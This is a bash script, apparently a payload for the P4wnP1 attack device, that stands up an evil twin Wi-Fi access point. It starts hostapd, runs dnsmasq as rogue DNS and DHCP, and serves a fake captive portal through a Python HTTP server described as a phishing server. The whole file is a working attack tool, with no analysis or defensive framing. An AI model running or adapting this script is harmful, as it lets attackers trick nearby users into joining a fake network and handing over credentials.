#!/bin/bash
# /opt/p4wnp1/payloads/network/wifi_ap_stealer.sh
# Description: Evil twin AP with rogue DNS, DHCP, and HTTP phishing server

set -euo pipefail

# === Config ===
PAYLOAD_NAME="wifi_ap_stealer"
HOSTAPD_CONF="/opt/p4wnp1/config/${PAYLOAD_NAME}_hostapd.conf"
DNSMASQ_CONF="/opt/p4wnp1/config/${PAYLOAD_NAME}_dnsmasq.conf"
WEB_ROOT="/opt/p4wnp1/www"
LOG_DIR="/opt/p4wnp1/logs"
LOG="$LOG_DIR/${PAYLOAD_NAME}.log"
WEB_LOG="$LOG_DIR/${PAYLOAD_NAME}_web.log"
DNS_LOG="$LOG_DIR/${PAYLOAD_NAME}_dnsmasq.log"

mkdir -p "$LOG_DIR" "$WEB_ROOT"
exec > >(tee -a "$LOG") 2>&1

echo "[*] Starting Evil AP (wifi_ap_stealer) at $(date)"

# === Validate configs ===
[[ -f "$HOSTAPD_CONF" ]] || { echo "[!] Missing hostapd config: $HOSTAPD_CONF"; exit 1; }
[[ -f "$DNSMASQ_CONF" ]] || { echo "[!] Missing dnsmasq config: $DNSMASQ_CONF"; exit 1; }

# === Kill previous rogue services ===
pkill -f hostapd || true
pkill -f dnsmasq || true
pkill -f "python3 -m http.server" || true
sleep 1

# === Launch rogue AP ===
echo "[+] Launching hostapd..."
hostapd "$HOSTAPD_CONF" &

sleep 2

echo "[+] Launching dnsmasq..."
dnsmasq --conf-file="$DNSMASQ_CONF" --log-facility="$DNS_LOG" &

# === Launch fake captive portal ===
echo "[+] Launching phishing web server from $WEB_ROOT"
cd "$WEB_ROOT"
python3 -m http.server 80 > "$WEB_LOG" 2>&1 &

echo "[✓] Evil AP + phishing portal is now active."
